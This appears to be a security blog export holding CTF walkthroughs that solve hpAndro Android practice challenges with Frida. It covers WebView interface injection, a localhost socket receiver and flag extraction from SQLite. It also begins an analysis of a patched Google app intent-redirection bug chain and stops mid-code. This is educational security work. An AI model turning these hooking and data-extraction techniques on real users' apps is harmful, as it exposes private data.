\u0026#39;android.webkit.WebResourceResponse\u0026#39;, argumentTypes: [\u0026#39;android.webkit.WebView\u0026#39;, \u0026#39;android.webkit.WebResourceRequest\u0026#39;], implementation(webView, request) { ... } }], } }); It won\u0026rsquo;t work in this scenario because there is no way (or not an easy available way) to add annotations to a class or method in Frida. I also tried looking for a way to do that with reflection in Java, but it wasn\u0026rsquo;t possible either.\nSo I had to go for an alternative. I tried to use a class that already has a @JavascriptInterface in the application.\nIn this application I had the following methods:\n-\u0026gt; v0.f.i4\n@JavascriptInterface public void postMessage(String str) { try { h2.k kVar = h2.k.DEBUG; h2.a(kVar, \u0026#34;OSJavaScriptInterface:postMessage: \u0026#34; + str, null); JSONObject jSONObject = new JSONObject(str); String string = jSONObject.getString(\u0026#34;type\u0026#34;); if (string.equals(\u0026#34;rendering_complete\u0026#34;)) { b(jSONObject); } else if (string.equals(\u0026#34;action_taken\u0026#34;) \u0026amp;\u0026amp; !i4.this.b.i) { a(jSONObject); } } catch (JSONException e) { e.printStackTrace(); } } -\u0026gt; v0.c.b.b.g.a.fq\n@JavascriptInterface public final String getClickSignals(String str) { String str2; if (TextUtils.isEmpty(str)) { str2 = \u0026#34;Click string is empty, not proceeding.\u0026#34;; } else { gv1 d = this.b.d(); if (d == null) { str2 = \u0026#34;Signal utils is empty, ignoring.\u0026#34;; } else { rl1 rl1 = d.b; if (rl1 == null) { str2 = \u0026#34;Signals object is empty, ignoring.\u0026#34;; } else if (this.b.getContext() != null) { return rl1.g(this.b.getContext(), str, this.b.getView(), this.b.a()); } else { str2 = \u0026#34;Context is null, ignoring.\u0026#34;; } } } a.e(str2); return \u0026#34;\u0026#34;; } @JavascriptInterface public final void notify(String str) { if (TextUtils.isEmpty(str)) { k.R2(\u0026#34;URL is empty, ignoring message\u0026#34;); } else { c1.i.post(new hq(this, str)); } } So here the most convenient class was \u0026ldquo;v0.c.b.b.g.a.fq\u0026rdquo;, because it has a the notify Method which receives an String.\nThe final script with this concept is the following one {{websocket.js}}, but when I run it I get the following error:\n[Twitch::com.hpandro.androidsecurity]-\u0026gt; \u0026#34;\u0026lt;instance: v0.c.b.b.g.a.fq\u0026gt;\u0026#34; Process crashed: Bad access due to invalid address *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** Build fingerprint: \u0026#39;Android/vbox86p/vbox86p:9/PI/138:userdebug/test-keys\u0026#39; Revision: \u0026#39;0\u0026#39; ABI: \u0026#39;x86\u0026#39; pid: 17009, tid: 17135, name: JavaBridge \u0026gt;\u0026gt;\u0026gt; com.hpandro.androidsecurity \u0026lt;\u0026lt;\u0026lt; signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x10 Cause: null pointer dereference eax 00000000 ebx e5e7a85c ecx e2b80b00 edx 00000001 edi e9af5d9c esi e2b80b00 ebp bcd3c608 esp bcd3c520 eip e5d7f707 backtrace: #00 pc 005b1707 /system/lib/libart.so (offset 0x28a000) (artQuickGenericJniTrampoline+103) #01 pc 005f6b8f /system/lib/libart.so (offset 0x5ea000) (art_quick_generic_jni_trampoline+63) #02 pc 005f0b82 /system/lib/libart.so (offset 0x28a000) (art_quick_invoke_stub+338) #03 pc 000a30ce /system/lib/libart.so (offset 0x97000) (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+222) #04 pc 004d3349 /system/lib/libart.so (offset 0x28a000) (art::(anonymous namespace)::InvokeWithArgArray(art::ScopedObjectAccessAlreadyRunnable const\u0026amp;, art::ArtMethod*, art::(anonymous namespace)::ArgArray*, art::JValue*, char const*)+89) #05 pc 004d45f7 /system/lib/libart.so (offset 0x28a000) (art::InvokeVirtualOrInterfaceWithJValues(art::ScopedObjectAccessAlreadyRunnable const\u0026amp;, _jobject*, _jmethodID*, jvalue*)+471) #06 pc 00381e1f /system/lib/libart.so (offset 0x28a000) (art::JNI::CallVoidMethodA(_JNIEnv*, _jobject*, _jmethodID*, jvalue*)+959) #07 pc 02ecb568 /data/app/com.android.chrome-rZxYnE7qcLsVDKktRW3EUw==/base.apk (offset 0xbdc000) *** [Twitch::com.hpandro.androidsecurity]-\u0026gt; I then tested the same scenario in another custom application and it didn\u0026rsquo;t work either. I suppose the bug is related to the fact that the browser engine runs in another process, so there can be an error whenever they try to call a changed method in the android application injected with Frida.\nThe last option here is to upload a class that would set the JavascriptInterface so the message is sent to Java. This can be done with the following Frida API:\nJava.openClassFile(\u0026quot;\u0026hellip;\u0026quot;);\nwhich receives the path of a jar, class or dex file. So I needed to create a valid dex file with the class that has the JavaInterface.\nI created a project on Android Studio, and coded the following class:\npackage com.hpandro.example; import android.webkit.JavascriptInterface; import android.webkit.WebView; public class JInterfaceInternal { /** Show a toast from the web page */ @JavascriptInterface public void showMessage(String toast) { innerFunction(toast); } public void innerFunction(String content) { System.out.println(\u0026#34;Injected class!! \u0026#34; + content); } public static void setJavaInterface(WebView webView) { webView.addJavascriptInterface(new JInterfaceInternal(),\u0026#34;JInterface\u0026#34;); } } Then I built it, generating an apk. I unzipped it to get the classes.dex file. After this I had to convert it to jar with the dex2jar tool, in order to remove potential classes that would crash the process of hpAndro. I decided to do it with the jar and not directly with the dex file, because it is easier to manipulate as it is a zip file with .class files per each class. The next step was to upload it to any folder in the application, and then I run:\nJava.perform( function () { Java.openClassFile(\u0026#34;/data/data/com.hpandro.androidsecurity/files/injectablefinal.dex\u0026#34;).load(); }); Note: the openClassFile does not work well with early instrumentation. Note2: in order to solve this in one shot, the dex file should be downloaded with Frida to a folder, and then injected automatically with a setTimeout or by overriding some method. I did not do it this way in order to remove complexity of the final solution and focus on the important parts.\nStep d - Hook the method from the JavascriptInterface with Frida. Once the class is injected, we have to run:\n//this is the method hooked from Frida Java.perform( function() { var JInternal = Java.use(\u0026#34;com.hpandro.example.JInterfaceInternal\u0026#34;); JInternal.showMessage.implementation = function (message) { console.log(message); } }); //script that changes the behavior of the WebView Java.perform( function () { var newClass = Java.use(\u0026#34;com.hpandro.example.JInterfaceInternal\u0026#34;); var a = Java.use(\u0026#39;v0.a.a.a.a\u0026#39;); a.J.implementation = function (webView, str, z, z2, z3, z4, z5) { newClass.setJavaInterface(webView); webView.getSettings().setMixedContentMode(0); return this.J(webView, str, z, z2, z3, z4, z5); } var WebViewClient = Java.use(\u0026#39;v0.d.a.c.a.d.j.b\u0026#39;); WebViewClient.shouldInterceptRequest.overload(\u0026#39;android.webkit.WebView\u0026#39;, \u0026#39;android.webkit.WebResourceRequest\u0026#39;).implementation = function (webView, request) { var WebResourceResponse = Java.use(\u0026#39;android.webkit.WebResourceResponse\u0026#39;); var isFavicon = request.getUrl().toString().search(\u0026#34;favicon.ico\u0026#34;) \u0026gt; 0 || request.getUrl().toString().search(\u0026#34;mytheme.min.css\u0026#34;) \u0026gt; 0; var URL = Java.use(\u0026#39;java.net.URL\u0026#39;); var url = URL.$new(request.getUrl().toString()); var HttpURLConnection = Java.use(\u0026#39;java.net.HttpURLConnection\u0026#39;); var urlConnection = Java.cast(url.openConnection(),HttpURLConnection); var String = Java.use(\u0026#39;java.lang.String\u0026#39;); urlConnection.setRequestProperty(String.$new(\u0026#34;User-Agent\u0026#34;), String.$new(\u0026#34;hpAndro\u0026#34;)); var BufferedInputStream = Java.use(\u0026#39;java.io.BufferedInputStream\u0026#39;); var inputStr = BufferedInputStream.$new(urlConnection.getInputStream()); var webResourceRes = null; if (!isFavicon) { var strToPrint = readNewStream(inputStr); //convert to inputStr var resultado = String.$new(strToPrint); var ByteArrayInputStream = Java.use(\u0026#34;java.io.ByteArrayInputStream\u0026#34;); var byteArrayInputStream = ByteArrayInputStream.$new(resultado.getBytes()); var InputStream = Java.use(\u0026#34;java.io.InputStream\u0026#34;); var newInputStream = Java.cast(byteArrayInputStream,InputStream); webResourceRes = WebResourceResponse.$new(\u0026#34;text/html\u0026#34;,\u0026#34;utf-8\u0026#34;, newInputStream); } else { webResourceRes = WebResourceResponse.$new(\u0026#34;image/vnd.microsoft.icon\u0026#34;,\u0026#34;gzip\u0026#34;, inputStr); } return webResourceRes; } }); This ended up showing the message in the console, but sometimes it crashed (I still do not know the reason if this behavior), so it wasn\u0026rsquo;t reliable. I wanted to find a more stable way to do it.\nOne of the ways that I found to do this was sending the content in an out of band way. There were lots of alternatives, but I decided to use sockets. So in this case in order to make this work, I needed two components. The first one was a Java class that sends the flag over a socket. This was done in the following way:\nI added a method in the JInterfaceInternal class:\npublic class JInterfaceInternal { @JavascriptInterface public void sendMessage(String toast) { MessageSender messageSender = new MessageSender(toast); } and then created the MessageSender class that opens a socket and sends a message over there:\npublic class MessageSender { protected static String SERVER_IP = \u0026#34;127.0.0.1\u0026#34;; protected static int SERVER_PORT = 23389; private String messageToSend = null; private PrintWriter output; private BufferedReader input; public MessageSender(String messageToSend) { this.messageToSend = messageToSend; Thread thread1 = new Thread(new Thread1()); thread1.start(); } class Thread1 implements Runnable { public void run() { Socket socket; try { socket = new Socket(MessageSender.SERVER_IP, MessageSender.SERVER_PORT); output = new PrintWriter(socket.getOutputStream()); input = new BufferedReader(new InputStreamReader(socket.getInputStream())); new Thread(new Thread3(messageToSend)).start(); } catch (IOException e) { e.printStackTrace(); } } } class Thread3 implements Runnable { private String message; Thread3(String message) { this.message = message; } @Override public void run() { output.write(message); output.flush(); } } } I also needed to create the message receiver. I decided to create it on Frida directly, and this is the result:\nJava.perform( function() { var Runnable = Java.use(\u0026#34;java.lang.Runnable\u0026#34;); var Thread1 = Java.registerClass({ name: \u0026#39;com.example.Thread1\u0026#39;, implements: [Runnable], methods: { run() { var ServerSocket = Java.use(\u0026#34;java.net.ServerSocket\u0026#34;); var Socket = Java.use(\u0026#34;java.net.Socket\u0026#34;); var BufferedReader = Java.use(\u0026#34;java.io.BufferedReader\u0026#34;); var InputStreamReader = Java.use(\u0026#34;java.io.InputStreamReader\u0026#34;); var serverSocket = ServerSocket.$new(23389); while (true) { var socket = serverSocket.accept(); input = BufferedReader.$new(InputStreamReader.$new(socket.getInputStream())); var message = input.readLine(); if (message != null) { console.log(message); } } } } }); var Thread = Java.use(\u0026#34;java.lang.Thread\u0026#34;); var MessageReceiver2 = Java.registerClass({ name: \u0026#39;com.example.MessageReceiver2\u0026#39;, methods: { $init() { var thread1 = Thread.$new(Thread1.$new()); thread1.start(); } } }); MessageReceiver2.$new(); }); And after running the application this way, I could get the flag in a more reliable way.\nIn the following link https://github.com/CesarMRodriguez/lunesdemobile/tree/main/Sesion%206 you can find the application we used for this post and the scripts used to solve the challenge.\n","permalink":"https://cmrodriguez.me/blog/hpandro-4/","tags":["Frida","Android","CTF","Challenge","Websocket"],"title":"Solving CTF with Frida - Part 4"},{"categories":["Frida","Android","CTF","Challenge","SQLite"],"contents":"In this series of posts I\u0026rsquo;ll be solving some persistence challenges from hpandro ctf challenges. hpAndro created an Android application with multiple vulnerabilities, following the MSTG.\nWe have two different challenges to solve:\nSQLite database storage. SQLite encrypted storage. SQLite database storage I start by searching the AndroidManifest.xml to find the Activity that could be called in order to solve the task:\n\u0026lt;activity android:name=\u0026#34;com.hpandro.androidsecurity.ui.activity.task.datastorage.SQLiteDataBaseActivity\u0026#34;/\u0026gt; by checking the com.hpandro.androidsecurity.ui.activity.task.datastorage.SQLiteDataBaseActivity class. The first method to see is onCreate where I found the OnClickListener event for a button with if btnCheckStorageFlag:\n((Button) y(R.id.btnCheckStorageFlag)).setOnClickListener(new j0(2, this)); I went to the class j0, where we had to focus on the following code (the important code is i == 2 because of the first parameter sent in the constructor to the class:\n} else if (i == 2) { ProgressBar progressBar = (ProgressBar) ((SQLiteDataBaseActivity) this.f).y(R.id.progress); g.d(progressBar, \u0026#34;progress\u0026#34;); progressBar.setVisibility(0); a aVar = ((SQLiteDataBaseActivity) this.f).s; if (aVar != null) { aVar.b(\u0026#34;db\u0026#34;); } else { g.k(\u0026#34;presenter\u0026#34;); throw null; } } I had to check what type of variable is \u0026ldquo;s\u0026rdquo;, which is of type \u0026ldquo;v0.d.a.c.a.d.b.e.a\u0026rdquo;. It is being called with the this variable, which is a SQLiteDataBaseActivity:\nthis.s = new a(this); In the constructor of a, the SQLiteDataBaseActivity is casted to b and set to the \u0026ldquo;b\u0026rdquo; attribute:\npublic a(b bVar) { g.e(bVar, \u0026#34;activity\u0026#34;); this.b = bVar; } I searched where this variable was being used, and I found it on the following method:\npublic void a(r rVar) { r rVar2 = rVar; b bVar = this.a.b; g.d(rVar2, \u0026#34;result\u0026#34;); bVar.b(rVar2); } which is being used in the following method (from v0.d.a.c.a.d.b.e.a class):\npublic final void b(String str) { g.e(str, \u0026#34;flag\u0026#34;); a().c(v0.d.a.b.a.b.a().b(str).e(y0.a.o.a.a).a(y0.a.i.a.a.a()).b(new C0142a(this), new b(this))); } In the a method the application calls bVar.b(rVar2); which is the b method from SQLiteBaseActivity.\nWhenever I went to the method, I found that at the end a toast is being generated with the following message: \u0026ldquo;Successfully added flag to SQLite.\u0026rdquo;. I saw that toast on the application when I press the button to retrieve the flag:\npublic void b(r rVar) { g.e(rVar, \u0026#34;response\u0026#34;); ProgressBar progressBar = (ProgressBar) y(R.id.progress); g.d(progressBar, \u0026#34;progress\u0026#34;); progressBar.setVisibility(8); v0.d.a.d.b.a aVar = new v0.d.a.d.b.a(this); String f = v0.a.a.a.a.f(rVar, \u0026#34;flag\u0026#34;, \u0026#34;response.asJsonObject.get(\\\u0026#34;flag\\\u0026#34;)\u0026#34;, \u0026#34;response.asJsonObject.get(\\\u0026#34;flag\\\u0026#34;).asString\u0026#34;); o j = rVar.d().j(\u0026#34;flag\u0026#34;); g.d(j, \u0026#34;response.asJsonObject.get(\\\u0026#34;flag\\\u0026#34;)\u0026#34;); String substring = f.substring(1, j.g().length() - 1); g.d(substring, \u0026#34;(this as java.lang.Strin…ing(startIndex, endIndex)\u0026#34;); g.e(substring, \u0026#34;data\u0026#34;); StringBuilder sb = new StringBuilder(\u0026#34;\u0026#34;); int i = 0; while (i \u0026lt; substring.length()) { int i2 = i + 2; sb.append((char) v0.a.a.a.a.x(substring, i, i2, \u0026#34;(this as java.lang.Strin…ing(startIndex, endIndex)\u0026#34;, 16, 16)); i = i2; } String sb2 = sb.toString(); g.d(sb2, \u0026#34;output.toString()\u0026#34;); g.e(sb2, \u0026#34;flag\u0026#34;); SQLiteDatabase writableDatabase = aVar.getWritableDatabase(); ContentValues contentValues = new ContentValues(); String str = v0.d.a.d.b.b.a; contentValues.put(\u0026#34;flag\u0026#34;, sb2); Toast.makeText(aVar.e, writableDatabase.insert(\u0026#34;Flags\u0026#34;, null, contentValues) == 0 ? \u0026#34;Failed to add flag to SQLite.\u0026#34; : \u0026#34;Successfully added flag to SQLite.\u0026#34;, 0).show(); Toast.makeText(this, \u0026#34;Storage flag received successfully.\u0026#34;, 1).show(); } I did not try to analyze all the content on the method, just the instructions related to the database:\na. A databse instance is retrieved\nSQLiteDatabase writableDatabase = aVar.getWritableDatabase(); b. A ContentValue instance is set with a key-pair \u0026ldquo;flag\u0026rdquo;, sb2. This class is used to execute updates and inserts. The keys are the name of the columns on the tables, and the values are set in the second parameter:\ncontentValues.put(\u0026#34;flag\u0026#34;, sb2); c. Then the data is stored in the database:\nToast.makeText(aVar.e, writableDatabase.insert(\u0026#34;Flags\u0026#34;, null, contentValues) == 0 ? \u0026#34;Failed to add flag to SQLite.\u0026#34; : \u0026#34;Successfully added flag to SQLite.\u0026#34;, 0).show(); In order to find which database is being updated I needed to find the name of the file with the db. I found it in:\nv0.d.a.d.b.a aVar = new v0.d.a.d.b.a(this); I checked the constructor of \u0026ldquo;v0.d.a.d.b.a\u0026rdquo;, and I found the following:\npublic a(Context context) { super(context, \u0026#34;AndroidSecurity.db\u0026#34;, (SQLiteDatabase.CursorFactory) null, 1); g.e(context, \u0026#34;context\u0026#34;); String str = b.a; this.e = context; } In that method the AndroidSecurity.db file is the one being opened, so after finding that informations I had the name of the file AndroidSecurity.db, the name of the table (Flags) and the name of column (flag).\nI had two alternatives now to solve the challenge. The first one was checking the content of the folder of the application, and the second one is using Frida. I started with the first one:\na- Search where was the file located (generally it is in the folder databases of the private folder of the application):\n\u0026gt; find /data/data/com.hpandro.androidsecurity -name AndroidSecurity.db which returns just the following result:\n/data/data/com.hpandro.androidsecurity/databases/AndroidSecurity.db I opened the database and read the table Flags:\nsqlite3 /data/data/com.hpandro.androidsecurity/databases/AndroidSecurity.db and then execute:\nselect * from Flags; which returns:\n1|hpandro{sqlite.5xQcqhGNCVoXinSqZWJau1SXgdfX3oYp} 2|hpandro{sqlite.5xQcqhGNCVoXinSqZWJau1SXgdfX3oYp} 3|hpandro{sqlite.5xQcqhGNCVoXinSqZWJau1SXgdfX3oYp} 4|hpandro{sqlite.5xQcqhGNCVoXinSqZWJau1SXgdfX3oYp} 5|hpandro{sqlite.5xQcqhGNCVoXinSqZWJau1SXgdfX3oYp} 6|hpandro{sqlite.5xQcqhGNCVoXinSqZWJau1SXgdfX3oYp} 7|hpandro{sqlite.5xQcqhGNCVoXinSqZWJau1SXgdfX3oYp} 8|hpandro{sqlite.5xQcqhGNCVoXinSqZWJau1SXgdfX3oYp} So each time I press the button that retrieves the flag, it adds a new row to the table.\nAt this point I had the challenge solved, but I got curious about where the flag was retrieved from. By checking the traffic sent and received from the servers I got the following content:\n{ \u0026#34;flag\u0026#34;: \u0026#34;16870616e64726f7b73716c6974652e357851637168474e43566f58696e53715a574a617531535867646658336f59707d1\u0026#34; } I wanted to know how that hexa String was converted to the flag in the database. In the b method from SQLiteDataBaseActivity:\nThe first thing the application does is remove the first and the last numbers from the flag:\nString substring = f.substring(1, j.g().length() - 1); and then it iterates the String:\nint i = 0; while (i \u0026lt; substring.length()) { int i2 = i + 2; sb.append((char) v0.a.a.a.a.x(substring, i, i2, \u0026#34;(this as java.lang.Strin…ing(startIndex, endIndex)\u0026#34;, 16, 16)); i = i2; } In the while code the following method is called:\nv0.a.a.a.a.x(substring, i, i2, \u0026#34;(this as java.lang.Strin…ing(startIndex, endIndex)\u0026#34;, 16, 16) where i is an even number (it starts with the value 0 and it is being incremented 2) and i2 = i + 2. Let\u0026rsquo;s check the following examples:\nfirst time application gets in while: i = 0, i2 = 2, second time application gets in while: i = 2, i2 = 4, X method does the following:\npublic static int x(String str, int i, int i2, String str2, int i3, int i4) { String substring = str.substring(i, i2); \u0026lt;-- takes two digits of String (0,1 - 2,3 - 4,5) g.d(substring, str2); y0.a.n.a.h(i3); return Integer.parseInt(substring, i4); \u0026lt;-- converts it to a decimal number. } and then it casts it to a char. Let\u0026rsquo;s test this with Frida:\nJava.perform( function () { var aClass = Java.use(\u0026#34;v0.a.a.a.a\u0026#34;); aClass.x.implementation = function (str, i, i2, str2, i3, i4) { console.log(\u0026#34;input str=\u0026#34;+str+\u0026#34; i=\u0026#34; + i + \u0026#34; i2=\u0026#34; + i2 + \u0026#34; i4=\u0026#34; + i4); var res = this.x(str, i, i2, str2, i3, i4); console.log(\u0026#34;result= \u0026#34; + res); console.log(\u0026#34;charat= \u0026#34; + String.fromCharCode(res)); return res; } }); which will return the characters from the flag. Then I created a script that retrieves the full flag by hooking the SQLiteDatabase.insert method:\nJava.perform( function () { var SQLiteDatabase = Java.use(\u0026#34;android.database.sqlite.SQLiteDatabase\u0026#34;); var ContentValues = Java.use(\u0026#34;android.content.ContentValues\u0026#34;); var SetClass = Java.use(\u0026#34;java.util.Set\u0026#34;); var MapEntryClass = Java.use(\u0026#34;java.util.Map$Entry\u0026#34;); SQLiteDatabase.insert.implementation = function (table, otherVal, contentValues) { console.log(\u0026#34;Valor insertado en tabla: \u0026#34; + table); var valueSetGeneric = contentValues.valueSet(); var valueSet = Java.cast(valueSetGeneric,SetClass); var iterator = valueSet.iterator(); while (iterator.hasNext()) { var mapEntry = Java.cast(iterator.next(),MapEntryClass); console.log(mapEntry.getKey() + \u0026#34;=\u0026#34; + mapEntry.getValue().toString()); } return this.insert(table, otherVal, contentValues); } }); EncryptedSqliteDB In this challenge I could not get to te task after pressing it:\nWhat was weird initially, is that in the application whenever a task is not ready a Toast shows an error pointing that. I searched for the place where the SQLiteDataBaseActivity was being called (it had to be through an Intent), and in order to compare what was being done with it. I found the class \u0026ldquo;v0.d.a.c.b.c\u0026rdquo; which is a Fragment and it has the following code in the onClick method:\n... //this if with multiple or corresponds to root check exercises, which were not ready in this version (now they are ready though) } else if (g.a(str2, y(R.string.root_management)) || g.a(str2, y(R.string.potentially_dangerous)) || g.a(str2, y(R.string.root_clocking)) || g.a(str2, y(R.string.text_keys)) || g.a(str2, y(R.string.dangerous_props)) || g.a(str2, y(R.string.busybox_binaries)) || g.a(str2, y(R.string.su_binary)) || g.a(str2, y(R.string.su_exists)) || g.a(str2, y(R.string.rw_system)) || g.a(str2, y(R.string.emulator_detection)) || g.a(str2, y(R.string.debugger_detection))) { return; } else { //here the sqlite databse activity is called if (g.a(str2, y(R.string.sqlite_db))) { intent = new Intent(c(), SQLiteDataBaseActivity.class); //and here is the issue for any other activity that is not the EncryptedDatabaseActivity navigate to an activity. } else if (!g.a(str2, y(R.string.sqlite_edb))) { if (g.a(str2, y(R.string.realm_db))) { ... } else { //click on EncryptedDatabaseActivity ends up here always, so the Activity is never called return; } That method is the behavior from the Task button that evaluates the Activity to call based on the parameter sent to it when the onClick is executed. As the comments on the code explains there is no way to call the activity from the UI even when the Activity seems to be functional.\nHere we have two alternatives:\na- Change the smali code and recompile the application in order to navigate to the Activity\nb- Navigate to the activity with Frida. Again this could be done with two main strategies:\nb.1- Change the behavior of the onClick method to create an Intent and send the application to the desired activity. b.2- Create some code that will not hook anything, but will force the application to navigate to the Activity.\nHere is the code for the second alternative:\nJava.perform( function () { var Intent = Java.use(\u0026#34;android.content.Intent\u0026#34;); var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var startIntent = Intent.$new(); startIntent.setClassName(String.$new(\u0026#34;com.hpandro.androidsecurity\u0026#34;),String.$new(\u0026#34;com.hpandro.androidsecurity.ui.activity.task.datastorage.EncryptSQLiteDBActivity\u0026#34;)); //myIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startIntent.setFlags(0x10000000); Java.use(\u0026#39;android.app.ActivityThread\u0026#39;).currentApplication().startActivity(startIntent); }); After we do that, the application shows the EncryptSQLiteDBActivity. The behavior of the Activity is like the one on the last challenge. The application gets the flag from the following URL:\nGET http://hpandro.raviramesh.info/flagstore.php?flag=edb\nwhich is obfuscated with the same mechanism as in the SQLite activity:\n//este es el mismo script que en caso anterior para desencriptar. Se guarda en sb el resultado. while (i \u0026lt; substring.length()) { int i2 = i + 2; sb.append((char) v0.a.a.a.a.x(substring, i, i2, \u0026#34;(this as java.lang.Strin…ing(startIndex, endIndex)\u0026#34;, 16, 16)); i = i2; } //no se hace nada con sb (g.d es una validación que se agrega por el uso de Kotlin) g.d(sb.toString(), \u0026#34;output.toString()\u0026#34;); Toast.makeText(this, \u0026#34;Insecure Storage flag received successfully.\u0026#34;, 1).show(); ProgressBar progressBar = (ProgressBar) y(R.id.progress); g.d(progressBar, \u0026#34;progress\u0026#34;); progressBar.setVisibility(8); We still want to solve this with Frida. It is a bit harder because we do not have a clear point where the output is being used (in the previous example it was the insert on the db. We\u0026rsquo;ll do the following:\nhook the function that returns the flag:\nString f = v0.a.a.a.a.f(rVar, \u0026#34;flag\u0026#34;, \u0026#34;response.asJsonObject.get(\\\u0026#34;flag\\\u0026#34;)\u0026#34;, \u0026#34;response.asJsonObject.get(\\\u0026#34;flag\\\u0026#34;).asString\u0026#34;); and overload it in order to decode the hexa String:\nJava.perform( function () { var ClassToHook = Java.use(\u0026#34;v0.a.a.a.a\u0026#34;); var StringJava = Java.use(\u0026#34;java.lang.String\u0026#34;); var strFlag = StringJava.$new(\u0026#34;flag\u0026#34;); var strCommand = StringJava.$new(\u0026#34;(this as java.lang.Strin…ing(startIndex, endIndex)\u0026#34;); ClassToHook.f.implementation = function (rVar, str, str2, str3) { var returnValue = this.f(rVar, str, str2, str3); if (strFlag.equals(str)) { //procesdo el contenido var strResponse = returnValue.substring(1); var res = \u0026#34;\u0026#34;; var i = 0; while (i \u0026lt; strResponse.length - 1) { var i2 = i + 2; var resInterno = ClassToHook.x(strResponse, i, i2, strCommand, 16, 16); res = res + String.fromCharCode(resInterno); i = i2; } console.log(res); } return returnValue; } }); During the stream people suggested to hook the following instruction:\ng.d(sb.toString(), \u0026#34;output.toString()\u0026#34;); So the script that was created was the following one:\nJava.perform( function () { var StringBuilder = Java.use(\u0026#34;java.lang.StringBuilder\u0026#34;); StringBuilder.toString.implementation = function () { var resultado = this.toString(); //this if is just to show the content for the application when it has a flag if (resultado.indexOf(\u0026#34;hpandro{\u0026#34;) \u0026gt;= 0) { console.log(\u0026#34;resultado: \u0026#34; + resultado); } return resultado; } }); In this post we didn\u0026rsquo;t go too deep on SQLite Databases, and we played a bit more with Frida and reversing the application.\nIn the following link https://github.com/CesarMRodriguez/lunesdemobile/tree/main/Sesion%201 you can find the application we used for this post\nIn the following repo you\u0026rsquo;ll have the link to the script used on the sqlite task: https://github.com/CesarMRodriguez/lunesdemobile/tree/main/Sesion%204\nAnd in the following link you\u0026rsquo;ll have the link to the scripts used for the encrypted sqlite task: https://github.com/CesarMRodriguez/lunesdemobile/tree/main/Sesion%204\n","permalink":"https://cmrodriguez.me/blog/hpandro-3/","tags":["Frida","Android","CTF","Challenge","SQLite"],"title":"Solving CTF with Frida - Part 3"},{"categories":["Android","Bug"],"contents":"In this post I\u0026rsquo;ll do an analysis of the vulnerability found in analized the bug found on the Google application com.google.android.googlequicksearchbox. The original post can be found in the following Oversecured post\nThe first time I read it, I could get the idea of the vulnerability found on the explanation, but I had a hard time to understand the path the application takes in order to exploit it. This is because the researcher that did the post showed the output of the tool they used to find the bugs (particularly the intent redirection). So I decided to download the apk and then doing a static analysis on it to figure out how the vulnerability really worked.\nThe original post did not point the particular version used to execute the analysis. It just stated that the bug was fixed in May. So I went to apkpure, and downloaded the newest version from April. In this case the version was: v12.15.9.23.\nInitially the bug is a chain of three different bugs:\na- Intent redirection. This bug lets an attacker to consume any component declared by the application (even non exported ones) b- Unrestricted read/write file. In this case there is a content provider which gives access to any file in the application folder with read and write rights. It is not exported, but as there was found an Intent redirection, it can be used as well. c- Google play command execution. Whenever a file is stored in a particular folder, the application loads it in the ClassLoader.\nAfter all the steps are followed, the remaining step is the call of any component that triggers a deserialization (I\u0026rsquo;ll explain a bit about this later on)\nIntent redirection In this case the original post shows the output of the tool, I could see easily two different activities exported:\ncom.google.android.apps.gsa.searchnow.SearchNowActivity com.google.android.googlequicksearchbox.SearchActivity I\u0026rsquo;ll do the analysis on the first one:\nThe application starts the Activity by calling onCreate. By tracking what is being done with the intent (it is needed to receive parameters from external applications, which is what I am looking for in order to exploit the vulnerability), I found that the application calls the following method:\neVar.f67447b.l(eVar.f67446a.getIntent(), a2, true); Let\u0026rsquo;s dissect this line of code:\neVar.f67446a is the SearchNowActivity, so the first parameter is the intent received by the activity when it is called: a2 is the Bundle received by the application. eVar.f67447b is a variable of type: com.google.android.apps.gsa.searchnow.ak. Based on a fast analysis it is not that easy to figure out what this class do. But we do not need to understand it all to follow the flow of the application.\npublic final void l(Intent intent, Bundle bundle, boolean z2) { Intent intent2; y yVar; y yVar2; l lVar; if (!z2 \u0026amp;\u0026amp; intent != null \u0026amp;\u0026amp; intent.getBooleanExtra(\u0026#34;reuse_search_now_activity\u0026#34;, false)) { //reuse_search_now_activity is not being set on the exploit } this.E = intent; this.K = false; if (intent != null) { boolean z3 = z2 \u0026amp;\u0026amp; this.x.j(m.UD) \u0026amp;\u0026amp; intent.getBooleanExtra(\u0026#34;show_acp_plate\u0026#34;, false); this.t = z3; if (z3) { //show_acp_plate is not being set on the exploit } if (intent.getExtras() == null || !intent.getExtras().containsKey(\u0026#34;KEY_HANDOVER_THROUGH_VELVET\u0026#34;)) { //intent comes with extras in teh exploit } else { //intent2 is an Intent sent as a parameter to the application intent2 = (Intent) intent.getExtras().getParcelable(\u0026#34;KEY_HANDOVER_THROUGH_VELVET\u0026#34;); intent.removeExtra(\u0026#34;KEY_HANDOVER_THROUGH_VELVET\u0026#34;); } if (intent2 != null \u0026amp;\u0026amp; bundle == null) { //using the intent2 here this.f67424e.a(intent2); } ... So I need to see what f67424e.a does with that intent:\nf67424e is an interface: com.google.android.apps.gsa.shared.util.s.g. In order to find which method is being called I need to know which class implements this interface. I looked at the same package to find it:\ncom.google.android.apps.gsa.shared.util.s.c com.google.android.apps.gsa.shared.util.s.a (which extends c and it implements g). By the transitivity property of classes, a implements g: I checked again the flow of calls done till here, and I found that the class com.google.android.apps.gsa.searchnow.f has the following constructor:\npublic f(a\u0026lt;ak\u0026gt; aVar, a\u0026lt;dagger.a\u0026lt;com.google.android.apps.gsa.shared.util.s.a\u0026gt;\u0026gt; aVar2, a\u0026lt;dagger.a\u0026lt;b\u0026gt;\u0026gt; aVar3, a\u0026lt;com.google.android.apps.gsa.shared.r.a.a\u0026gt; aVar4, a\u0026lt;aw\u0026lt;com.google.android.apps.gsa.shared.logger.j.a\u0026gt;\u0026gt; aVar5) { this.f67452a = aVar; this.f67453b = aVar2; this.f67454c = aVar3; this.f67455d = aVar4; this.f67456e = aVar5; } which is being called in the onCreate method from SearchNowActivity:\nthis.f67401j = new f(aVar, b2, m.b(aVar3), aic.R.aH(), aic.R.f27201c.bJ()); so this left me with the option of class com.google.android.apps.gsa.shared.util.s.a.\nThe method called is the following one:\npublic boolean a(Intent intent) { if (m(intent)) { return b(intent, this); } boolean a2 = super.a(intent); \u0026lt;-- this method is called in c (superclass of a) It calls the a implementation on the super class (c):\npublic boolean a(Intent intent) { if (!m(intent)) { try { ... KeyguardManager keyguardManager = (KeyguardManager) 